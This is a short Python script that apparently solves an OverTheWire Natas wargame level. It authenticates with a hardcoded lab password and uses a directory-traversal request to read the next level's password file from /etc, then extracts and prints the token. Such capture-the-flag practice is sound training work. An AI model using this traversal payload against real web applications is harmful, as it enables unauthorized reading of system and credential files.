import re
import requests

s = requests.session()
s.auth = ("natas7","7z3hEENjQtflzgnT29q7wAvMNfZdh0i9")
game = s.get("http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../etc/natas_webpass/natas8")
nextcode = re.findall('[a-zA-Z0-9]{32}',game.text)

print (nextcode[1])